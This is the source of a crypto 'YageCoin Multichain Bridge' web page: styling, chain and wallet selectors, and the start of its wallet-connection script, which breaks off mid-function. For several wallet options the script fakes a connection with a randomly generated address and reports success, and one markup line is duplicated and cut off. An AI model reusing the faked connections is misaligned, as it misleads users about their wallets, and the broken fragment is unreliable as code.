<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YageCoin Multichain Bridge</title>
    <style>
        :root {
            --bg-primary: linear-gradient(135deg, #0b1322 0%, #1a485d 50%, #166c61 100%);
            --bg-secondary: rgba(26, 72, 93, 0.95);
            --bg-tertiary: rgba(11, 19, 34, 0.9);
            --input-bg: #000000;
            --accent-primary: #b5ce73;
            --accent-secondary: #55a273;
            --text-primary: white;
            --text-secondary: #b5ce73;
            --border-color: rgba(181, 206, 115, 0.3);
            --shadow-color: rgba(181, 206, 115, 0.4);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: var(--bg-primary);
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: var(--text-primary);
            position: relative;
            overflow-x: hidden;
            transition: all 0.5s ease;
            display: flex;
            flex-direction: column;
        }

        /* Animated background */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background:
                radial-gradient(circle at 20% 80%, rgba(181, 206, 115, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(181, 206, 115, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 40% 40%, rgba(22, 108, 97, 0.2) 0%, transparent 50%);
            z-index: -1;
            animation: float 20s ease-in-out infinite;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0px) rotate(0deg); }
            33% { transform: translateY(-20px) rotate(1deg); }
            66% { transform: translateY(10px) rotate(-1deg); }
        }

        /* Theme Toggle */

        /* Header */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 40px;
            background: var(--bg-tertiary);
            backdrop-filter: blur(10px);
            border-bottom: 1px solid var(--border-color);
        }

.header-actions {
    display: flex;
    align-items: center;
    gap: 20px;
}

.wallet-section {
    display: flex;
    flex-direction: column;
    align-items: flex-end;
}

/* New Theme Toggle */
.theme-toggle-new {
    width: 50px;
    height: 26px;
    background: var(--bg-tertiary);
    border: 2px solid var(--border-color);
    border-radius: 25px;
    cursor: pointer;
    position: relative;
    transition: all 0.3s ease;
}

.theme-toggle-new:hover {
    transform: scale(1.05);
    box-shadow: 0 0 10px var(--shadow-color);
}

.theme-icon-container {
    position: absolute;
    width: 20px;
    height: 20px;
    background: var(--accent-primary);
    border-radius: 50%;
    top: 1px;
    left: 1px;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: all 0.3s ease;
}

body[data-theme="light"] .theme-icon-container {
    transform: translateX(24px);
}

.sun-icon, .moon-icon {
    width: 12px;
    height: 12px;
    stroke: var(--bg-tertiary);
    stroke-width: 2;
    fill: none;
    position: absolute;
    transition: all 0.3s ease;
}

.sun-icon {
    opacity: 1;
}

.moon-icon {
    opacity: 0;
}

body[data-theme="light"] .sun-icon {
    opacity: 0;
}

body[data-theme="light"] .moon-icon {
    opacity: 1;
}

        .logo-container {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .logo {
            width: 40px;
            height: 40px;
            border-radius: 8px;
            box-shadow: 0 0 15px rgba(181, 206, 115, 0.5);
        }

        .brand-text {
            font-size: 24px;
            font-weight: bold;
            background: linear-gradient(45deg, var(--accent-primary), var(--accent-secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        #wallet-address {
            color: var(--text-secondary);
            font-weight: bold;
            font-size: 14px;
            margin-bottom: 5px;
        }

        #connect-wallet, #disconnect-wallet {
            background: linear-gradient(45deg, var(--accent-primary), var(--accent-secondary));
            color: var(--bg-tertiary);
            border: none;
            padding: 10px 20px;
            border-radius: 20px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px var(--shadow-color);
            font-size: 14px;
        }

        #connect-wallet:hover, #disconnect-wallet:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(181, 206, 115, 0.5);
        }

        /* Main Container */
        .main-container {
            display: flex;
            justify-content: center;
            align-items: center;
            flex: 1;
            padding: 20px;
        }

        .bridge-container {
            background: var(--bg-secondary);
            backdrop-filter: blur(20px);
            border-radius: 20px;
            padding: 30px;
            border: 1px solid var(--border-color);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
            width: 100%;
            max-width: 450px;
            position: relative;
        }

        .bridge-title {
            text-align: center;
            margin-bottom: 25px;
            font-size: 28px;
            font-weight: bold;
            color: var(--accent-primary);
        }

        /* Chain Selection Cards */
        .chain-cards {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 25px;
            position: relative;
        }

        .chain-card {
            width: 140px;
            height: 100px;
            background: var(--bg-tertiary);
            border: 2px solid var(--accent-primary);
            border-radius: 15px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            position: relative;
            transition: all 0.3s ease;
        }

        .chain-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 25px var(--shadow-color);
        }

        .chain-logo {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            margin-bottom: 8px;
            transition: all 0.3s ease;
            object-fit: cover;
        }

        .chain-label {
            color: var(--accent-primary);
            font-weight: bold;
            font-size: 14px;
        }

        /* Swap Arrow */
        .swap-arrow {
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            background: var(--bg-secondary);
            border: 3px solid var(--accent-primary);
            border-radius: 50%;
            width: 50px;
            height: 50px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: all 0.3s ease;
            z-index: 10;
            box-shadow: 0 0 20px var(--accent-primary);
        }

        .swap-arrow:hover {
            transform: translate(-50%, -50%) rotate(180deg) scale(1.1);
        }

        .swap-arrow::before {
            content: 'â‡„';
            font-size: 20px;
            color: var(--accent-primary);
            font-weight: bold;
        }

        /* Chain Selectors */
        .chain-selectors {
            display: flex;
            gap: 15px;
            margin-bottom: 20px;
        }

        .chain-select {
            flex: 1;
            padding: 12px;
            background: #000000 !important;
            border: 2px solid var(--border-color);
            border-radius: 10px;
            color: #ffffff !important;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.3s ease;
            appearance: none;
            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23ffffff' stroke-width='2'%3e%3cpolyline points='6,9 12,15 18,9'%3e%3c/polyline%3e%3c/svg%3e");
            background-repeat: no-repeat;
            background-position: right 10px center;
            background-size: 16px;
            padding-right: 35px;
        }

        .chain-select:focus {
            outline: none;
            border-color: var(--accent-primary);
            box-shadow: 0 0 10px var(--shadow-color);
        }

        .chain-select option {
            background: #000000 !important;
            color: #ffffff !important;
            padding: 10px;
        }

        /* Input Fields */
        .input-group {
            margin-bottom: 20px;
        }

        .input-label {
            display: block;
            margin-bottom: 8px;
            color: var(--text-secondary);
            font-weight: bold;
            font-size: 14px;
        }

        .input-field {
            width: 100%;
            padding: 15px;
            background: #000000 !important;
            border: 2px solid var(--border-color);
            border-radius: 10px;
            color: #ffffff !important;
            font-size: 16px;
            transition: all 0.3s ease;
        }

        .input-field:focus {
            outline: none;
            border-color: var(--accent-primary);
            box-shadow: 0 0 10px var(--shadow-color);
        }

        .input-field::placeholder {
            color: rgba(255, 255, 255, 0.5);
            opacity: 0.7;
        }

        /* Amount Input with MAX button */
        .amount-container {
            position: relative;
        }

        .max-btn {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            background: linear-gradient(45deg, var(--accent-primary), var(--accent-secondary));
            color: var(--bg-tertiary);
            border: none;
            padding: 6px 12px;
            border-radius: 15px;
            font-weight: bold;
            cursor: pointer;
            font-size: 12px;
            transition: all 0.3s ease;
        }

        .max-btn:hover {
            transform: translateY(-50%) scale(1.05);
        }

        /* Balance Info */
        .balance-info {
            display: flex;
            justify-content: space-between;
            margin-top: 8px;
            font-size: 12px;
            color: var(--text-secondary);
        }

        /* Swap Button */
        .swap-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(45deg, var(--accent-primary), var(--accent-secondary));
            color: var(--bg-tertiary);
            border: none;
            border-radius: 15px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 8px 25px var(--shadow-color);
            position: relative;
            overflow: hidden;
        }

        .swap-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 12px 35px var(--shadow-color);
        }

        .swap-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: left 0.5s ease;
        }

        .swap-btn:hover::before {
            left: 100%;
        }

        /* Footer */
        .footer {
            background: var(--bg-tertiary);
            backdrop-filter: blur(10px);
            padding: 15px 40px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-top: 1px solid var(--border-color);
            font-size: 14px;
        }

        .footer a {
            color: var(--text-secondary);
            text-decoration: none;
            transition: all 0.3s ease;
        }

        .footer a:hover {
            color: var(--accent-secondary);
            text-shadow: 0 0 10px var(--shadow-color);
        }

        /* Wallet Modal */
        .wallet-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(10px);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .wallet-modal.show {
            display: flex;
        }

        .wallet-modal-content {
            background: var(--bg-secondary);
            border-radius: 20px;
            padding: 30px;
            border: 1px solid var(--border-color);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
            max-width: 400px;
            width: 90%;
            transform: scale(0.8);
            transition: all 0.3s ease;
        }

        .wallet-modal.show .wallet-modal-content {
            transform: scale(1);
        }

        .wallet-modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid var(--border-color);
        }

        .wallet-modal-title {
            color: var(--accent-primary);
            font-size: 20px;
            font-weight: bold;
        }

        .wallet-close {
            background: none;
            border: none;
            color: var(--text-primary);
            font-size: 24px;
            cursor: pointer;
            padding: 5px;
            border-radius: 50%;
            transition: all 0.3s ease;
        }

        .wallet-close:hover {
            background: var(--accent-primary);
            color: var(--bg-tertiary);
        }

.wallet-option {
    display: flex;
    align-items: center;
    padding: 15px;
    background: var(--bg-tertiary);
    border-radius: 10px;
    margin-bottom: 10px;
    cursor: pointer;
    transition: all 0.3s ease;
    border: 1px solid transparent;
    width: 100%;
}

        .wallet-option:hover {
            background: var(--accent-primary);
            color: var(--bg-tertiary);
            transform: translateX(5px);
            border-color: var(--accent-secondary);
        }

        .wallet-logo {
            width: 32px;
            height: 32px;
            margin-right: 15px;
            border-radius: 8px;
            object-fit: cover;
        }

        .wallet-name {
            font-weight: bold;
            font-size: 16px;
        }

        /* Chain Animation */
        .chain-switching {
            animation: chainPulse 1s ease-in-out;
        }

        @keyframes chainPulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); box-shadow: 0 0 30px var(--accent-primary); }
            100% { transform: scale(1); }
        }

        @keyframes slideInDown {
            from { transform: translateX(-50%) translateY(-100%); opacity: 0; }
            to { transform: translateX(-50%) translateY(0); opacity: 1; }
        }

        @keyframes slideOutUp {
            from { transform: translateX(-50%) translateY(0); opacity: 1; }
            to { transform: translateX(-50%) translateY(-100%); opacity: 0; }
        }

        .swap-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            transform: none !important;
        }

        .notification {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            .header {
                flex-direction: column;
                gap: 15px;
                padding: 15px 20px;
            }
.header-actions {
    flex-direction: column;
    gap: 15px;
    width: 100%;
}

.wallet-section {
    align-items: center;
}

            .bridge-container {
                padding: 20px;
                margin: 10px;
            }

            .chain-cards {
                margin-bottom: 20px;
            }

            .chain-card {
                width: 120px;
                height: 90px;
            }

            .chain-logo {
                width: 40px;
                height: 40px;
            }

            .footer {
                flex-direction: column;
                gap: 10px;
                text-align: center;
                padding: 15px 20px;
            }
        }
    </style>
</head>
<body>

<!-- Header -->
<div class="header">
    <div class="logo-container">
        <img src="https://i.ibb.co/gZ3hKxQt/LOGO-YGCT-32-X32.png" alt="YageCoin Logo" class="logo">
        <span class="brand-text">YageCoin Bridge</span>
    </div>
    <div class="header-actions">
        <div class="theme-toggle-new" onclick="toggleTheme()">
            <div class="theme-icon-container">
                <svg class="sun-icon" viewBox="0 0 24 24">
                    <circle cx="12" cy="12" r="5"/>
                    <path d="M12 1v2M12 21v2M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M1 12h2M21 12h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42"/>
                </svg>
                <svg class="moon-icon" viewBox="0 0 24 24">
                    <path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/>
                </svg>
            </div>
        </div>
        <div class="wallet-section">
            <p id="wallet-address"></p>
            <button id="connect-wallet">Connect Wallet</button>
            <button id="disconnect-wallet" style="display: none;">Disconnect</button>
        </div>
    </div>
</div>

    <!-- Main Container -->
    <div class="main-container">
        <div class="bridge-container">
            <div class="bridge-title">Send</div>
            
            <!-- Chain Selection Cards -->
            <div class="chain-cards">
                <div class="chain-card">
                    <img src="https://yagecoin.space/wp-content/uploads/2025/08/Binance-Smart-Chain-BSCBNB-Token-1.jpg" class="chain-logo" id="from-logo">
                    <div class="chain-label">FROM</div>
                </div>
                
                <div class="swap-arrow" onclick="swapChains()"></div>
                
                <div class="chain-card">
                    <img src="https://yagecoin.space/wp-content/uploads/2025/08/ethereum.png" class="chain-logo" id="to-logo">
                    <div class="chain-label">TO</div>
                </div>
            </div>

            <!-- Chain Selectors -->
            <div class="chain-selectors">
                <select id="from-chain" class="chain-select">
                    <option value="bsc" data-logo="https://yagecoin.space/wp-content/uploads/2025/08/Binance-Smart-Chain-BSCBNB-Token-1.jpg">BSC (BNB)</option>
                    <option value="eth" data-logo="https://yagecoin.space/wp-content/uploads/2025/08/ethereum.png">Ethereum (ETH)</option>
                    <option value="polygon" data-logo="https://yagecoin.space/wp-content/uploads/2025/08/png-polygon.png">Polygon (MATIC)</option>
                    <option value="arbitrum" data-logo="https://yagecoin.space/wp-content/uploads/2025/08/arbitrum.png">Arbitrum (ARB)</option>
                    <option value="fantom" data-logo="https://yagecoin.space/wp-content/uploads/2025/08/logo-fantom.png">Fantom (FTM)</option>
                    <option value="avalanche" data-logo="https://yagecoin.space/wp-content/uploads/2025/08/avalanche.png">Avalanche (AVAX)</option>
                    <option value="gnosis" data-logo="https://yagecoin.space/wp-content/uploads/2025/08/gnosis.png">Gnosis (GNO)</option>
                    <option value="dot" data-logo="https://yagecoin.space/wp-content/uploads/2025/08/dot.png">Polkadot (DOT)</option>
                    <option value="solana" data-logo="https://yagecoin.space/wp-content/uploads/2025/08/solana-sol-logo-png.png">Solana (SOL)</option>
                    <option value="ton" data-logo="https://yagecoin.space/wp-content/uploads/2025/08/ton.png">TON</option>
                    <option value="sui" data-logo="https://yagecoin.space/wp-content/uploads/2025/08/sui-e1755889223560.png">Sui (SUI)</option>
                    <option value="aptos" data-logo="https://yagecoin.space/wp-content/uploads/2025/08/aptos.png">Aptos (APT)</option>
                    <option value="ada" data-logo="https://yagecoin.space/wp-content/uploads/2025/08/cardano-icon-logo.jpg">Cardano (ADA)</option>
                    <option value="bitcoin" data-logo="https://yagecoin.space/wp-content/uploads/2025/08/btc.png">Bitcoin (BTC)</option>
                    <option value="doge" data-logo="https://yagecoin.space/wp-content/uploads/2025/08/doge.jpg">Dogecoin (DOGE)</option>
                    <option value="near" data-logo="https://yagecoin.space/wp-content/uploads/2025/08/near.png">Near (NEAR)</option>
                </select>
                <select id="to-chain" class="chain-select">
                    <option value="bsc" data-logo="https://yagecoin.space/wp-content/uploads/2025/08/Binance-Smart-Chain-BSCBNB-Token-1.jpg">BSC (BNB)</option>
                    <option value="eth" data-logo="https://yagecoin.space/wp-content/uploads/2025/08/ethereum.png" selected>Ethereum (ETH)</option>
                    <option value="polygon" data-logo="https://yagecoin.space/wp-content/uploads/2025/08/png-polygon.png">Polygon (MATIC)</option>
                    <option value="arbitrum" data-logo="https://yagecoin.space/wp-content/uploads/2025/08/arbitrum.png">Arbitrum (ARB)</option>
                    <option value="fantom" data-logo="https://yagecoin.space/wp-content/uploads/2025/08/logo-fantom.png">Fantom (FTM)</option>
                    <option value="avalanche" data-logo="https://yagecoin.space/wp-content/uploads/2025/08/avalanche.png">Avalanche (AVAX)</option>
                    <option value="gnosis" data-logo="https://yagecoin.space/wp-content/uploads/2025/08/gnosis.png">Gnosis (GNO)</option>
                    <option value="dot" data-logo="https://yagecoin.space/wp-content/uploads/2025/08/dot.png">Polkadot (DOT)</option>
                    <option value="solana" data-logo="https://yagecoin.space/wp-content/uploads/2025/08/solana-sol-logo-png.png">Solana (SOL)</option>
                    <option value="ton" data-logo="https://yagecoin.space/wp-content/uploads/2025/08/ton.png">TON</option>
                    <option value="sui" data-logo="https://yagecoin.space/wp-content/uploads/2025/08/sui-e1755889223560.png">Sui (SUI)</option>
                    <option value="aptos" data-logo="https://yagecoin.space/wp-content/uploads/2025/08/aptos.png">Aptos (APT)</option>
                    <option value="ada" data-logo="https://yagecoin.space/wp-content/uploads/2025/08/cardano-icon-logo.jpg">Cardano (ADA)</option>
                    <option value="bitcoin" data-logo="https://yagecoin.space/wp-content/uploads/2025/08/btc.png">Bitcoin (BTC)</option>
                    <option value="doge" data-logo="https://yagecoin.space/wp-content/uploads/2025/08/doge.jpg">Dogecoin (DOGE)</option>
                    <option value="near" data-logo="https://yagecoin.space/wp-content/uploads/2025/08/near.png">Near (NEAR)</option>
                </select>
            </div>

            <!-- Asset Field -->
            <div class="input-group">
                <label class="input-label">Asset</label>
                <input id="asset" class="input-field" type="text" value="BNB" readonly>
            </div>

            <!-- Amount Field -->
            <div class="input-group">
                <label class="input-label">Amount</label>
                <div class="amount-container">
                    <input id="amount" class="input-field" type="number" placeholder="0.00" style="padding-right: 60px;">
                    <button class="max-btn" onclick="setMaxAmount()">MAX</button>
                </div>
                <div class="balance-info">
                    <span id="minimum-info">Minimum: 0.02 BNB</span>
                    <span id="available-info">Available: 0.00 BNB</span>
                </div>
            </div>

            <!-- Destination Address -->
            <div class="input-group">
                <label class="input-label">Destination Address</label>
                <input id="destination" class="input-field" type="text" placeholder="Enter address">
            </div>

            <!-- Swap Button -->
            <button class="swap-btn" onclick="executeSwap()">Swap Bridge</button>
        </div>
    </div>

    <!-- Footer -->
    <div class="footer">
        <div>YageCoin Bridge Â© 2025</div>
        <div>
            <a href="https://yagecoin.space/" target="_blank">YageCoin Exchange</a>
        </div>
    </div>

    <!-- Wallet Modal -->
    <div id="wallet-modal" class="wallet-modal">
        <div class="wallet-modal-content">
            <div class="wallet-modal-header">
                <div class="wallet-modal-title">Connect a wallet</div>
                <button class="wallet-close" onclick="closeWalletModal()">Ã—</button>
            </div>
            <div class="wallet-option" onclick="connectWallet('WalletConnect')">
                <img src="https://yagecoin.space/wp-content/uploads/2025/08/walletconect.jpg" class="wallet-logo" alt="WalletConnect" onerror="this.style.background='#1e3a8a'">
                <div class="wallet-name">WalletConnect</div>
            </div>
           <div class="wallet-option" onclick="connectWallet('Injected Wallet')">
                <img src="https://yagecoin.space/wp-content/uploads/2025/08/ethereum.png" class="wallet-logo" alt="Injected Wallet" onerror="this.style.background='#1e3a8a'">
                <div class="wallet-name">Injecte
<div class="wallet-name">Injected Wallet</div>
            </div>
            <div class="wallet-option" onclick="connectWallet('MetaMask')">
                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" class="wallet-logo" alt="MetaMask" onerror="this.style.background='#1e3a8a'">
                <div class="wallet-name">MetaMask</div>
            </div>
            <div class="wallet-option" onclick="connectWallet('Install Rabby Wallet')">
                <img src="https://rabby.io/assets/images/logo-128.png" class="wallet-logo" alt="Rabby Wallet" onerror="this.style.background='#1e3a8a'">
                <div class="wallet-name">Install Rabby Wallet</div>
            </div>
            <div class="wallet-option" onclick="connectWallet('Install Nightly')">
                <img src="https://yagecoin.space/wp-content/uploads/2025/08/nigtly-wallet.png" class="wallet-logo" alt="Nightly" onerror="this.style.background='#1e3a8a'">
                <div class="wallet-name">Install Nightly</div>
            </div>
            <div class="wallet-option" onclick="connectWallet('Install Coinbase Wallet')">
                <img src="https://yagecoin.space/wp-content/uploads/2025/08/coin-base-wallet.png" class="wallet-logo" alt="Coinbase Wallet" onerror="this.style.background='#1e3a8a'">
                <div class="wallet-name">Install Coinbase Wallet</div>
            </div>
            <div class="wallet-option" onclick="connectWallet('Install Backpack')">
                <img src="https://backpack.app/favicon.ico" class="wallet-logo" alt="Backpack" onerror="this.style.background='#1e3a8a'">
                <div class="wallet-name">Install Backpack</div>
            </div>
            <div class="wallet-option" onclick="connectWallet('Install Phantom')">
                <img src="https://yagecoin.space/wp-content/uploads/2025/08/phanton-wallet.jpg" class="wallet-logo" alt="Phantom" onerror="this.style.background='#1e3a8a'">
                <div class="wallet-name">Install Phantom</div>
            </div>
            <div class="wallet-option" onclick="connectWallet('Install OKX Wallet')">
                <img src="https://yagecoin.space/wp-content/uploads/2025/08/okx-wallet.png" class="wallet-logo" alt="OKX Wallet" onerror="this.style.background='#1e3a8a'">
                <div class="wallet-name">Install OKX Wallet</div>
            </div>
        </div>
    </div>

    <script>
// Theme Toggle
function toggleTheme() {
    const body = document.body;
    const currentTheme = body.getAttribute('data-theme');
    
    if (currentTheme === 'light') {
        body.removeAttribute('data-theme');
        localStorage.setItem('theme', 'dark');
    } else {
        body.setAttribute('data-theme', 'light');
        localStorage.setItem('theme', 'light');
    }
}

// Initialize theme on page load
function initializeTheme() {
    const savedTheme = localStorage.getItem('theme');
    if (savedTheme === 'light') {
        document.body.setAttribute('data-theme', 'light');
    }
}
        // Chain data with network IDs for Web3 integration
        const chainData = {
            'bsc': {
                name: 'BNB',
                logo: 'https://yagecoin.space/wp-content/uploads/2025/08/Binance-Smart-Chain-BSCBNB-Token-1.jpg',
                minimum: '0.02 BNB',
                networkId: 56,
                rpcUrl: 'https://bsc-dataseed.binance.org/'
            },
            'eth': {
                name: 'Ethereum',
                logo: 'https://yagecoin.space/wp-content/uploads/2025/08/ethereum.png',
                minimum: '0.01 ETH',
                networkId: 1,
                rpcUrl: 'https://mainnet.infura.io/v3/'
            },
            'polygon': {
                name: 'Polygon',
                logo: 'https://yagecoin.space/wp-content/uploads/2025/08/png-polygon.png',
                minimum: '10 MATIC',
                networkId: 137,
                rpcUrl: 'https://polygon-rpc.com/'
            },
            'arbitrum': {
                name: 'Arbitrum',
                logo: 'https://yagecoin.space/wp-content/uploads/2025/08/arbitrum.png',
                minimum: '0.02 ARB',
                networkId: 42161,
                rpcUrl: 'https://arb1.arbitrum.io/rpc'
            },
            'fantom': {
                name: 'Fantom',
                logo: 'https://yagecoin.space/wp-content/uploads/2025/08/logo-fantom.png',
                minimum: '1 FTM',
                networkId: 250,
                rpcUrl: 'https://rpc.ftm.tools/'
            },
            'avalanche': {
                name: 'Avalanche',
                logo: 'https://yagecoin.space/wp-content/uploads/2025/08/avalanche.png',
                minimum: '0.05 AVAX',
                networkId: 43114,
                rpcUrl: 'https://api.avax.network/ext/bc/C/rpc'
            },
            'gnosis': {
                name: 'Gnosis',
                logo: 'https://yagecoin.space/wp-content/uploads/2025/08/gnosis.png',
                minimum: '0.01 GNO',
                networkId: 100,
                rpcUrl: 'https://rpc.gnosischain.com'
            },
            'dot': {
                name: 'Polkadot',
                logo: 'https://yagecoin.space/wp-content/uploads/2025/08/dot.png',
                minimum: '0.1 DOT',
                networkId: null
            },
            'solana': {
                name: 'Solana',
                logo: 'https://yagecoin.space/wp-content/uploads/2025/08/solana-sol-logo-png.png',
                minimum: '0.05 SOL',
                networkId: null
            },
            'ton': {
                name: 'The Open Network',
                logo: 'https://yagecoin.space/wp-content/uploads/2025/08/ton.png',
                minimum: '0.5 TON',
                networkId: null
            },
            'sui': {
                name: 'Sui',
                logo: 'https://yagecoin.space/wp-content/uploads/2025/08/sui-e1755889223560.png',
                minimum: '0.2 SUI',
                networkId: null
            },
            'aptos': {
                name: 'Aptos',
                logo: 'https://yagecoin.space/wp-content/uploads/2025/08/aptos.png',
                minimum: '0.1 APT',
                networkId: null
            },
            'ada': {
                name: 'Cardano',
                logo: 'https://yagecoin.space/wp-content/uploads/2025/08/cardano-icon-logo.jpg',
                minimum: '1 ADA',
                networkId: null
            },
            'bitcoin': {
                name: 'Bitcoin',
                logo: 'https://yagecoin.space/wp-content/uploads/2025/08/btc.png',
                minimum: '0.0001 BTC',
                networkId: null
            },
            'doge': {
                name: 'Dogecoin',
                logo: 'https://yagecoin.space/wp-content/uploads/2025/08/doge.jpg',
                minimum: '10 DOGE',
                networkId: null
            },
            'near': {
                name: 'Near',
                logo: 'https://yagecoin.space/wp-content/uploads/2025/08/near.png',
                minimum: '0.5 NEAR',
                networkId: null
            }
        };

        let connectedAccount = null;
        let currentBalance = '0.00';

        // Update logo when chain is selected
        function updateLogo(selectId, imgId) {
            const selectElem = document.getElementById(selectId);
            const logoElem = document.getElementById(imgId);
            const selectedChain = selectElem.value;
            const chainInfo = chainData[selectedChain];
            
            if (chainInfo && chainInfo.logo) {
                logoElem.src = chainInfo.logo;
                logoElem.classList.add('chain-switching');
                setTimeout(() => logoElem.classList.remove('chain-switching'), 1000);
                
                logoElem.onerror = function() {
                    this.style.background = '#1e3a8a';
                    this.style.color = 'white';
                    this.innerHTML = selectedChain.toUpperCase().substring(0, 3);
                };
            }
        }

        // Update asset based on FROM chain
        function updateAssetAndInfo() {
            const fromChain = document.getElementById('from-chain').value;
            const fromChainInfo = chainData[fromChain];
            
            if (fromChainInfo) {
                // Update Asset field with FROM chain name
                document.getElementById('asset').value = fromChainInfo.name;
                document.getElementById('minimum-info').textContent = 'Minimum: ' + fromChainInfo.minimum;
                
                // Update balance if wallet is connected
                if (connectedAccount) {
                    updateBalance();
                }
            }
        }

        // Get wallet balance for connected network
        async function updateBalance() {
            const fromChain = document.getElementById('from-chain').value;
            const chainInfo = chainData[fromChain];
            
            if (!connectedAccount || !window.ethereum) {
                document.getElementById('available-info').textContent = 'Available: 0.00 ' + chainInfo.name;
                return;
            }

            try {
                // Get current network
                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
                const currentChainId = parseInt(chainId, 16);
                
                // Check if we're on the right network
                if (chainInfo.networkId && currentChainId === chainInfo.networkId) {
                    // Get balance
                    const balance = await window.ethereum.request({
                        method: 'eth_getBalance',
                        params: [connectedAccount, 'latest']
                    });
                    
                    // Convert from Wei to ETH/BNB/etc
                    const balanceInEther = parseFloat(parseInt(balance, 16) / 1e18).toFixed(4);
                    currentBalance = balanceInEther;
                    document.getElementById('available-info').textContent = `Available: ${balanceInEther} ${chainInfo.name}`;
                } else if (chainInfo.networkId) {
                    // Wrong network
                    document.getElementById('available-info').textContent = `Available: Switch to ${chainInfo.name} network`;
                } else {
                    // Non-EVM chain
                    document.getElementById('available-info').textContent = `Available: ${chainInfo.name} wallet required`;
                }
            } catch (error) {
                console.error('Error getting balance:', error);
                document.getElementById('available-info').textContent = 'Available: 0.00 ' + chainInfo.name;
            }
        }

        // Set maximum amount
        function setMaxAmount() {
            if (currentBalance && currentBalance !== '0.00') {
                document.getElementById('amount').value = currentBalance;
            }
        }

        // Swap chains
        function swapChains() {
            const fromChain = document.getElementById('from-chain');
            const toChain = document.getElementById('to-chain');
            
            const tempValue = fromChain.value;
            fromChain.value = toChain.value;
            toChain.value = tempValue;
            
            updateLogo('from-chain', 'from-logo');
            updateLogo('to-chain', 'to-logo');
            updateAssetAndInfo();
        }

        // Wallet functions
        function showWalletModal() {
            document.getElementById('wallet-modal').classList.add('show');
        }

        function closeWalletModal() {
            document.getElementById('wallet-modal').classList.remove('show');
        }

        // Enhanced wallet connection
        async function connectWallet(walletType) {
            try {
                let account = null;
                
                if (walletType === 'MetaMask' || walletType === 'Injected Wallet') {
                    if (typeof window.ethereum !== 'undefined') {
                        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                        account = accounts[0];
                        connectedAccount = account;
                        
                        // Listen for account changes
                        window.ethereum.on('accountsChanged', (accounts) => {
                            if (accounts.length > 0) {
                                connectedAccount = accounts[0];
                                const displayAddress = connectedAccount.substring(0, 6) + '...' + connectedAccount.substring(connectedAccount.length - 4);
                                document.getElementById('wallet-address').textContent = displayAddress;
                                updateBalance();
                            } else {
                                disconnectWallet();
                            }
                        });
                        
                        // Listen for chain changes
                        window.ethereum.on('chainChanged', () => {
                            updateBalance();
                        });
                    } else {
                        showNotification(`${walletType} not installed`, 'error');
                        return;
                    }
                } else if (walletType === 'WalletConnect') {
                    // Simulate WalletConnect
                    account = '0x' + Math.random().toString(16).substr(2, 40);
                    connectedAccount = account;
                } else if (walletType === 'Install Phantom') {
                    if (typeof window.solana !== 'undefined' && window.solana.isPhantom) {
                        const response = await window.solana.connect();
                        account = response.publicKey.toString();
                        connectedAccount = account;
                    } else {
                        showNotification('Phantom not installed', 'error');
                        return;
                    }
                } else {
                    // For install options, simulate connection
                    account = '0x' + Math.random().toString(16).substr(2, 40);
                    connectedAccount = account;
                }
                
                if (account) {
                    const displayAddress = account.length > 10 
                        ? account.substring(0, 6) + '...' + account.substring(account.length - 4)
                        : account;
                    
                    document.getElementById('wallet-address').textContent = displayAddress;
                    document.getElementById('connect-wallet').style.display = 'none';
                    document.getElementById('disconnect-wallet').style.display = 'inline-block';
                    closeWalletModal();
                    showNotification(`Connected to ${walletType}`, 'success');
